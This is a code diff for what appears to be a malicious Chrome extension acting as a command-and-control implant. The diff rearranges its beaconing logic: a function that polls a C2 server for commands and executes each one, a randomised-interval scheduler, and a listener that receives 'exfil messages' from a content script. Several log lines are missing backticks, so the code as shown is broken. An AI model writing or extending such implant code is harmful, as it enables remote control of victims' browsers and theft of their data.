@@ -306,6 +306,16 @@ async function beaconToC2() {
     console.error('[Beacon Error]', err.message);
   }
 }
+// Schedule next beacon
+function scheduleNextBeacon() {
+  const interval = getRandomInterval();
+  console.log([Beacon] Next in ${interval / 1000}s);
+  setTimeout(async () => {
+    await beaconToC2();
+    scheduleNextBeacon();
+  }, interval);
+}
+
 // Register agent
 async function registerAgent() {
   console.log('[RegisterAgent] Starting');
@@ -327,33 +337,6 @@ async function registerAgent() {
     console.error('[RegisterAgent Error]', err.message);
   }
 }
-// Beacon to fetch tasks
-async function beaconToC2() {
-  console.log([Beacon] Agent=${agent_id} => ${C2_SERVER}/api/commands);
-  try {
-    const res = await fetchWithRetry(${C2_SERVER}/api/commands?agent_id=${agent_id}, {
-      method: 'GET'
-    });
-    const commands = await res.json();
-    console.log([Beacon] Received ${commands.length} commands);
-    for (const cmd of commands) {
-      await handleCommand(cmd);
-    }
-  } catch (err) {
-    console.error('[Beacon Error]', err.message);
-  }
-}
-
-// Schedule next beacon
-function scheduleNextBeacon() {
-  const interval = getRandomInterval();
-  console.log([Beacon] Next in ${interval / 1000}s);
-  setTimeout(async () => {
-    await beaconToC2();
-    scheduleNextBeacon();
-  }, interval);
-}
-
 // Listen for exfil messages and other commands from content script
 if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage?.addListener) {
   chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
@@ -412,6 +395,7 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage?.addListener) {
   return true;
 });
 }
+
 
 
 
